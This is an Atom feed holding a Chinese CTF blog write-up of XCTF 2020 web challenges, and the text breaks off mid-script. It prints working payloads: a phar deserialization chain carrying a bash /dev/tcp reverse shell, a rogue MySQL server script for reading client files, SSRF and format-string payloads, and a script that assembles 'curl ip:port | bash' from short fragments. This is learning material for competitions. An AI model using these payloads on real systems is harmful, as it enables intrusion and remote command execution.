<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Cy9nus&#39;s Blog</title>
  
  <subtitle>人如果没有梦想，跟咸鱼有什么区别</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://cy9nusg4rd3n.github.io/"/>
  <updated>2020-04-18T04:03:30.417Z</updated>
  <id>https://cy9nusg4rd3n.github.io/</id>
  
  <author>
    <name>Cy9nus</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>xctf战役-2020(web部分复现)</title>
    <link href="https://cy9nusg4rd3n.github.io/2020/03/15/xctf%E6%88%98%E5%BD%B9-2020-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/"/>
    <id>https://cy9nusg4rd3n.github.io/2020/03/15/xctf战役-2020-web部分复现/</id>
    <published>2020-03-15T15:37:23.000Z</published>
    <updated>2020-04-18T04:03:30.417Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><ul><li>前言:xctf的质量还是非常高的，尽管仅能做出比赛的一两题，赛后复现也能学到很多东西<h1 id="webct"><a href="#webct" class="headerlink" title="webct"></a>webct</h1></li></ul><ol><li>扫面发现源码<a href="http://www.zip,其中注意的是**uoloads**目录有个.htaccess" target="_blank" rel="noopener">www.zip,其中注意的是**uoloads**目录有个.htaccess</a><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">php_flag</span> engine <span class="literal">off</span></span><br></pre></td></tr></table></figure></li></ol><a id="more"></a><ol start="2"><li>也就是说我们上传的脚本都不会被解析，所以直接上马菜刀是走不通的</li><li>但题目又要一个测试sql服务的功能，这容易想到<a href="https://www.jianshu.com/p/3d26180268d7" target="_blank" rel="noopener">Mysql客户端任意文件读取</a></li><li>而mysql数据库传入的option参数可控，将其设置为<strong>8</strong>可以开启<strong>MYSQLI_OPT_LOCAL_INFILE</strong>(这个我暂时没查到文档，我理解应该直接填MYSQLI_OPT_LOCAL_INFILE?)</li></ol><table><thead><tr><th>名称</th><th>描述</th></tr></thead><tbody><tr><td>MYSQLI_OPT_CONNECT_TIMEOUT</td><td>连接超时设置，以秒为单位（在 Windows 平台上，PHP 5.3.1 之后才支持此选项）。</td></tr><tr><td>MYSQLI_OPT_LOCAL_INFILE</td><td>启用或禁用 LOAD LOCAL INFILE 语句</td></tr><tr><td>MYSQLI_INIT_COMMAND</td><td>成功建立 MySQL 连接之后要执行的 SQL 语句</td></tr><tr><td>MYSQLI_READ_DEFAULT_FILE</td><td>从指定的文件中读取选项，而不是使用 my.cnf 中的选项</td></tr><tr><td>MYSQLI_READ_DEFAULT_GROUP</td><td>从 my.cnf 或者 MYSQL_READ_DEFAULT_FILE 指定的文件中 读取指定的组中的选项。</td></tr><tr><td>MYSQLI_SERVER_PUBLIC_KEY</td><td>SHA-256 认证模式下，要使用的 RSA 公钥文件。</td></tr><tr><td>MYSQLI_OPT_NET_CMD_BUFFER_SIZE</td><td>内部命令/网络缓冲大小， 仅在 mysqlnd 驱动下有效。</td></tr><tr><td>MYSQLI_OPT_NET_READ_BUFFER_SIZE</td><td>以字节为单位，读取 MySQL 命令报文时候的块大小， 仅在 mysqlnd 驱动下有效。</td></tr><tr><td>MYSQLI_OPT_INT_AND_FLOAT_NATIVE</td><td>将整数和浮点数类型的列转换成 PHP 的数值类型， 仅在 mysqlnd 驱动下有效。</td></tr></tbody></table><ol start="5"><li><p>利用脚本伪造服务器，直接读取/flag失败，根据源码想到构造phar文件让msyql去读取触发反序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Listfile</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file=$file;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">listdir</span><span class="params">()</span></span>&#123;</span><br><span class="line">        system(<span class="string">"ls "</span>.<span class="keyword">$this</span>-&gt;file).<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $arguments)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        system(<span class="string">"ls "</span>.<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>首先生成phar文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fileupload</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Listfile</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$payload=<span class="keyword">new</span> Listfile();</span><br><span class="line">$payload-&gt;file=<span class="string">'$(bash -c "bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1")'</span>;</span><br><span class="line">$file=<span class="keyword">new</span> Fileupload();</span><br><span class="line">$file-&gt;file=$payload;</span><br><span class="line">unlink(<span class="string">"./phar.phar"</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"./phar.phar"</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"GIF89a&lt;?php __HALT_COMPILER(); ?&gt;"</span>);</span><br><span class="line">$phar-&gt;setMetadata($file);</span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>);</span><br><span class="line"></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($file));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>改后缀为jpg上传，启动伪造服务器</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8 </span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line">logging.basicConfig(level=logging.DEBUG)</span><br><span class="line"></span><br><span class="line">filename=<span class="string">"phar:////var/www/html/uploads/phar.jpg"</span></span><br><span class="line">sv=socket.socket()</span><br><span class="line">sv.bind((<span class="string">""</span>,<span class="number">3309</span>))</span><br><span class="line">sv.listen(<span class="number">5</span>)</span><br><span class="line">conn,address=sv.accept()</span><br><span class="line">logging.info(<span class="string">'Conn from: %r'</span>, address)</span><br><span class="line">conn.sendall(<span class="string">"\x4a\x00\x00\x00\x0a\x35\x2e\x35\x2e\x35\x33\x00\x17\x00\x00\x00\x6e\x7a\x3b\x54\x76\x73\x61\x6a\x00\xff\xf7\x21\x02\x00\x0f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x70\x76\x21\x3d\x50\x5c\x5a\x32\x2a\x7a\x49\x3f\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00"</span>)</span><br><span class="line">conn.recv(<span class="number">9999</span>)</span><br><span class="line">logging.info(<span class="string">"auth okay"</span>)</span><br><span class="line">conn.sendall(<span class="string">"\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00"</span>)</span><br><span class="line">conn.recv(<span class="number">9999</span>)</span><br><span class="line">logging.info(<span class="string">"want file..."</span>)</span><br><span class="line">wantfile=chr(len(filename)+<span class="number">1</span>)+<span class="string">"\x00\x00\x01\xFB"</span>+filename</span><br><span class="line">conn.sendall(wantfile)</span><br><span class="line">content=conn.recv(<span class="number">9999</span>)</span><br><span class="line">logging.info(content)</span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure></li><li><p>payload如下，然后<strong>nv -lvp port</strong>反弹shell</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip=ip:port<span class="variable">&amp;user</span>=user<span class="variable">&amp;password</span>=passsword<span class="variable">&amp;option</span>=<span class="number">8</span></span><br></pre></td></tr></table></figure></li></ol><h1 id="fmkq"><a href="#fmkq" class="headerlink" title="fmkq"></a>fmkq</h1><ol><li><p>题目直接给了源码</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> </span></span><br><span class="line"><span class="php">error_reporting(<span class="number">0</span>); </span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'head'</span>])&amp;&amp;<span class="keyword">isset</span>($_GET[<span class="string">'url'</span>]))&#123; </span></span><br><span class="line"><span class="php">    $begin = <span class="string">"The number you want: "</span>; </span></span><br><span class="line"><span class="php">    extract($_GET); </span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>($head == <span class="string">''</span>)&#123; </span></span><br><span class="line"><span class="php">        <span class="keyword">die</span>(<span class="string">'Where is your head?'</span>); </span></span><br><span class="line"><span class="php">    &#125; </span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>(preg_match(<span class="string">'/[A-Za-z0-9]/i'</span>,$head))&#123; </span></span><br><span class="line">        die('Head can\'t be like this!'); </span><br><span class="line">    &#125; </span><br><span class="line">    if(preg_match('/log/i',$url))&#123; </span><br><span class="line">        die('No No No'); </span><br><span class="line">    &#125; </span><br><span class="line">    if(preg_match('/gopher:|file:|phar:|php:|zip:|dict:|imap:|ftp:/i',$url))&#123; </span><br><span class="line"><span class="php">        <span class="keyword">die</span>(<span class="string">'Don\'t use strange protocol!'</span>); </span></span><br><span class="line"><span class="php">    &#125; </span></span><br><span class="line"><span class="php">    $funcname = $head.<span class="string">'curl_init'</span>; </span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    $ch = $funcname(); </span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>($ch)&#123; </span></span><br><span class="line"><span class="php">        curl_setopt($ch, CURLOPT_URL, $url); </span></span><br><span class="line"><span class="php">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>); </span></span><br><span class="line"><span class="php">        $output = curl_exec($ch); </span></span><br><span class="line"><span class="php">        curl_close($ch); </span></span><br><span class="line"><span class="php">    &#125; </span></span><br><span class="line"><span class="php">    <span class="keyword">else</span>&#123; </span></span><br><span class="line"><span class="php">        $output = <span class="string">'rua'</span>; </span></span><br><span class="line"><span class="php">    &#125; </span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> sprintf($begin.<span class="string">'%d'</span>,$output); </span></span><br><span class="line"><span class="php">&#125; </span></span><br><span class="line"><span class="php"><span class="keyword">else</span>&#123; </span></span><br><span class="line"><span class="php">    show_source(<span class="keyword">__FILE__</span>); </span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure></li><li><p>看起来是个ssrf,首先head用\转义绕过，然后%s%覆盖begin，使得有结果输出，以下payload成功弹出百度</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?head=\<span class="variable">&amp;url</span>=www.baidu.com<span class="variable">&amp;begin</span>=%s%</span><br></pre></td></tr></table></figure></li><li><p>正常ssrf都是通过file等协议去读文件的，但是这里除了http(s)，把能用的协议都ban了,而且没法实行302跳转。比赛时我这里就GG</p></li><li><p>复现时发现居然内网开放8080端口,直接令url=127.0.0.1:8080</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Welcome to our FMKQ api, you could <span class="keyword">use</span> the <span class="keyword">help</span> information below        </span><br><span class="line"><span class="keyword">To</span> <span class="keyword">read</span> <span class="keyword">file</span>:            </span><br><span class="line">/<span class="keyword">read</span>/<span class="keyword">file</span>=example&amp;vipcode=example            </span><br><span class="line"><span class="keyword">if</span> you <span class="keyword">are</span> <span class="keyword">not</span> vip,let vipcode=<span class="number">0</span>,<span class="keyword">and</span> you can <span class="keyword">only</span> <span class="keyword">read</span> /tmp/&#123;<span class="keyword">file</span>&#125;       </span><br><span class="line">Other functions <span class="keyword">only</span> <span class="keyword">for</span> the vip!!!        </span><br><span class="line">%d</span><br></pre></td></tr></table></figure></li><li><p>不是vip的话只能读/tmp上的目录，但flag一般在根目录，我们得首先找到vipcode</p></li><li><p>/read/file=25,感觉像个<del>ssti</del><a href="https://paper.seebug.org/175/" target="_blank" rel="noopener">格式化字符串漏洞</a></p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The content <span class="keyword">of</span> &#123;<span class="number">5</span>*<span class="number">5</span>&#125; <span class="keyword">is</span> <span class="keyword">error</span>%d</span><br></pre></td></tr></table></figure></li><li><p>下面开始找相关类</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/read/file=&#123;file.<span class="variable">__class__</span>.<span class="variable">__init__</span>.<span class="variable">__globals__</span>&#125;</span><br><span class="line">找到<span class="string">'vip'</span>: &lt;class <span class="string">'base.vip.vip'</span>&gt;</span><br><span class="line"></span><br><span class="line">/read/file=&#123;file.<span class="variable">__class__</span>.<span class="variable">__init__</span>.<span class="variable">__globals__</span>[vip].<span class="variable">__init__</span>.<span class="variable">__globals__</span>&#125;</span><br><span class="line">找到<span class="string">'vipcode'</span>: <span class="string">'uJvFXyqiHnztNQBU10TYkepKjAh7xVMfmgdS4G9r5sWa6loL</span></span><br></pre></td></tr></table></figure></li><li><p>有了vipcode可以读取源码和列目录，知道flag在/fl4g_1s_h3re_u_wi11_rua里，但是读不了，于是读取项目代码</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">class vipreadfile():</span><br><span class="line">    def __init__(self,readfile):</span><br><span class="line">        self.filename = readfile.GetFileName()</span><br><span class="line">        self.<span class="built_in">path</span> = <span class="built_in">os</span>.<span class="built_in">path</span>.dirname(<span class="built_in">os</span>.<span class="built_in">path</span>.abspath(self.filename))</span><br><span class="line">        self.file = File(<span class="built_in">os</span>.<span class="built_in">path</span>.basename(<span class="built_in">os</span>.<span class="built_in">path</span>.abspath(self.filename)))</span><br><span class="line">        global current_folder_file</span><br><span class="line">        try:</span><br><span class="line">            current_folder_file = <span class="built_in">os</span>.listdir(self.<span class="built_in">path</span>)</span><br><span class="line">        except:</span><br><span class="line">            current_folder_file = current_folder_file</span><br><span class="line"></span><br><span class="line">    def __str__(self):</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'fl4g'</span> <span class="keyword">in</span> self.<span class="built_in">path</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'nonono,this folder is a secret!!!'</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">output</span> = <span class="string">''</span><span class="string">'Welcome,dear vip! Here are what you want:\r\nThe file you read is:\r\n'</span><span class="string">''</span></span><br><span class="line">            filepath = (self.<span class="built_in">path</span> + <span class="string">'/&#123;vipfile&#125;'</span>).<span class="built_in">format</span>(vipfile=self.file)</span><br><span class="line">            <span class="built_in">output</span> += filepath</span><br><span class="line">            <span class="built_in">output</span> += <span class="string">'\r\n\r\nThe content is:\r\n'</span></span><br><span class="line">            try:</span><br><span class="line">                f = <span class="built_in">open</span>(filepath,<span class="string">'r'</span>)</span><br><span class="line">                content = f.<span class="built_in">read</span>()</span><br><span class="line">                f.<span class="built_in">close</span>()</span><br><span class="line">            except:</span><br><span class="line">                content = <span class="string">'can\'t read'</span></span><br><span class="line">            <span class="built_in">output</span> += content</span><br><span class="line">            <span class="built_in">output</span> += <span class="string">'\r\n\r\nOther files under the same folder:\r\n'</span></span><br><span class="line">            <span class="built_in">output</span> += <span class="string">' '</span>.join(current_folder_file)</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">output</span></span><br></pre></td></tr></table></figure></li><li><p>不能出现f14g,用file的第一个字符也是f绕过即可</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?url=<span class="link">http://localhost:8080/read/file=&#123;vipfile.__class__.__init__.__globals__</span>[<span class="string">vipreadfile</span>]._<span class="emphasis">_module_</span><span class="emphasis">_[9]&#125;l4g_</span>1s<span class="emphasis">_h3re_</span>u<span class="emphasis">_wi11_</span>rua/flag%26vipcode=uJvFXyqiHnztNQBU10TYkepKjAh7xVMfmgdS4G9r5sWa6loL&amp;head=\&amp;begin=%s%</span><br></pre></td></tr></table></figure></li></ol><h1 id="hackme"><a href="#hackme" class="headerlink" title="hackme"></a>hackme</h1><ol><li>代码审计发现不同的session处理<a href="https://blog.csdn.net/weixin_44304686/article/details/91539645" target="_blank" rel="noopener">PHP反序列化入门之session反序列化</a></li><li><p>在签名处存在反序列化漏洞，只要用户名为admin就能访问/core/index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $admin;</span><br><span class="line">    <span class="keyword">public</span> $sign=<span class="string">"test_sign"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;admin = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> info();</span><br><span class="line">$b = serialize($a);</span><br><span class="line"><span class="keyword">echo</span> $b;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#O:4:"info":2:&#123;s:5:"admin";i:1;s:4:"sign";s:9:"test_sign";&#125;</span></span><br></pre></td></tr></table></figure></li><li><p>前面加上|然后签名成功访问/core/index.php</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'url'</span>])) &#123;</span></span><br><span class="line"><span class="php">        $url = $_POST[<span class="string">'url'</span>];</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> (filter_var($url, FILTER_VALIDATE_URL)) &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">if</span> (preg_match(<span class="string">'/(data:\/\/)|(&amp;)|(\|)|(\.\/)/i'</span>, $url)) &#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">echo</span> <span class="string">"you are hacker"</span>;</span></span><br><span class="line"><span class="php">            &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">                $res = parse_url($url);</span></span><br><span class="line"><span class="php"><span class="comment">//var_dump($res);</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span></span><br><span class="line"><span class="php">                <span class="keyword">if</span> (preg_match(<span class="string">'/127\.0\.0\.1$/'</span>, $res[<span class="string">'host'</span>])) &#123;</span></span><br><span class="line"><span class="php">                    $code = file_get_contents($url);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> strlen($code).<span class="string">"\n"</span>;</span></span><br><span class="line"><span class="php">                    <span class="keyword">if</span> (strlen($code) &gt;= <span class="number">4</span>) &#123;</span></span><br><span class="line"><span class="php">                        @exec($code);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">'success'</span>;</span></span><br><span class="line"><span class="php">                    &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">                        <span class="keyword">echo</span> <span class="string">"try again"</span>;</span></span><br><span class="line"><span class="php">                    &#125;</span></span><br><span class="line"><span class="php">                &#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">'fail'</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">            &#125;</span></span><br><span class="line"><span class="php">        &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">echo</span> <span class="string">"invalid url"</span>;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">        highlight_file(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"><span class="php">    &#125; </span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></li><li><p>filter_var和以及data协议绕过请看<a href="http://www.bubuko.com/infodetail-3221748.html" target="_blank" rel="noopener">ByteCTF_2019 BoringCode</a></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=compress<span class="selector-class">.zlib</span>:<span class="comment">//data:@127.0.0.1/plain;base64,xxxxx;</span></span><br></pre></td></tr></table></figure></li><li><p>file_get_contents会读取xxx的内容，接下来是在小于4个字节情况下getshell，这一看好像没办法，其实有的，具体看<a href="https://blog.csdn.net/u011377996/article/details/82464383" target="_blank" rel="noopener">Hitcon2017 babyfirst-revenge</a></p></li><li><p>这里还用到一个反弹shell的姿势</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl ip:port <span class="string">| bash</span></span><br></pre></td></tr></table></figure></li><li><p>如果页面有反弹shell的语句，比如bash -i ….是可以成功的</p></li><li>直接上脚本<figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf-<span class="number">8</span> -*-</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">from <span class="built_in">time</span> <span class="keyword">import</span> sleep</span><br><span class="line">from urllib <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line">payload = [</span><br><span class="line"># generate <span class="string">"g&gt; ht- sl"</span> to file <span class="string">"v"</span></span><br><span class="line"><span class="string">'&gt;dir'</span>,</span><br><span class="line"><span class="string">'&gt;sl'</span>,</span><br><span class="line"><span class="string">'&gt;g\&gt;'</span>,</span><br><span class="line"><span class="string">'&gt;ht-'</span>,</span><br><span class="line"><span class="string">'*&gt;v'</span>,</span><br><span class="line"># reverse file <span class="string">"v"</span> to file <span class="string">"x"</span>, content <span class="string">"ls -th &gt;g"</span></span><br><span class="line"><span class="string">'&gt;rev'</span>,</span><br><span class="line"><span class="string">'*v&gt;x'</span>,</span><br><span class="line"># generate <span class="string">"curl ip:port|bash;"</span></span><br><span class="line"><span class="string">'&gt;sh'</span>,</span><br><span class="line"><span class="string">'&gt;ba\\'</span>,</span><br><span class="line"><span class="string">'&gt;\|\\'</span>,</span><br><span class="line"><span class="string">'&gt;28\\'</span>,</span><br><span class="line"><span class="string">'&gt;1\\'</span>,</span><br><span class="line"><span class="string">'&gt;3.\\'</span>,</span><br><span class="line"><span class="string">'&gt;24\\'</span>,</span><br><span class="line"><span class="string">'&gt;8.\\'</span>,</span><br><span class="line"><span class="string">'&gt;9\\'</span>,</span><br><span class="line"><span class="string">'&gt;7.\\'</span>,</span><br><span class="line"><span class="string">'&gt;4\\'</span>,</span><br><span class="line"><span class="string">'&gt;\ \\'</span>,</span><br><span class="line"><span class="string">'&gt;rl\\'</span>,</span><br><span class="line"><span class="string">'&gt;cu\\'</span>,</span><br><span class="line"><span class="string">'sh x'</span>,</span><br><span class="line"><span class="string">'sh g'</span>,</span><br><span class="line"># got shell</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">header = &#123;</span><br><span class="line">    <span class="string">"Cookie"</span>: <span class="string">"PHPSESSID=ab2f2756d83f058180b6a0ae53ef8396"</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">data</span> = &#123;<span class="string">"url"</span>:<span 